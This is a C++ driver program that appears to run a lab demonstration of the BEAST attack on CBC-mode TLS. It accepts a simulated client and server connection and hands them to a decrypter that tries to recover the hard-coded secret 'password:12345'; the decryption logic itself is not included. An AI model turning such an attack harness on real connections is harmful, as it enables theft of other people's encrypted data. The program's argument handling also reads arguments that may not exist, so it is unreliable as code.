#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "../common/conf.h"
#include "controller.h"
#include "beast.h"

int main(int argc, char **argv) {
    int sockfd, new_fd;
    int server_fd, client_fd;
    socklen_t len;
    struct sockaddr_in my_addr, their_addr;
    unsigned int myport, lisnum;
    char buf[MAXBUF + 1];

    if (argc != 2 && argc != 4) {
        printf("wrong format of arguments, please follow the guidelines on README\n");
        exit(0);
    }

    in_addr server_addr;
    if (inet_aton(argv[1], &server_addr) == 0) {
        perror(argv[1]);
        exit(errno);
    }

    in_addr client_addr;
    if (inet_aton(argv[2], &client_addr) == 0) {
        perror(argv[2]);
        exit(errno);
    }

    if (argv[3])
        myport = atoi(argv[3]);
    else
        myport = 7838;

    if (argv[4])
        lisnum = atoi(argv[4]);
    else
        lisnum = 4;


    /* 开启一个 socket 监听 */
    if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        exit(1);
    } else
        printf("socket created\n");

    bzero(&my_addr, sizeof(my_addr));
    my_addr.sin_family = PF_INET;
    my_addr.sin_port = htons(myport);
    my_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sockfd, (struct sockaddr *) &my_addr, sizeof(struct sockaddr))
            == -1) {
        perror("bind");
        exit(1);
    } else
        printf("binded\n");

    if (listen(sockfd, lisnum) == -1) {
        perror("listen");
        exit(1);
    } else
        printf("begin listen\n");

    for(int i=0; i<2; i++){
        len = sizeof(struct sockaddr);
        if ((new_fd = accept(sockfd, (struct sockaddr *) &their_addr, &len))
                == -1) {
            perror("accept");
            exit(errno);
        } else {
            printf("server: got connection from %s, port %d, socket %d\n",
                    inet_ntoa(their_addr.sin_addr), ntohs(their_addr.sin_port),
                    new_fd);
            if (their_addr.sin_addr.s_addr == server_addr.s_addr) server_fd = new_fd;
            else client_fd = new_fd;
        }
    }

    T_Controller* ctrl = new T_Controller(server_fd, client_fd);
    BeastDecrypter* beast = new BeastDecrypter(MAXBUF, 16, ctrl);
    if (beast->run("password:12345", "password")) printf("A successful BEAST attack!\n");
        else printf("BEAST attack fails\n");
    close(client_fd);
    close(server_fd);
    close(sockfd);
    return 0;
}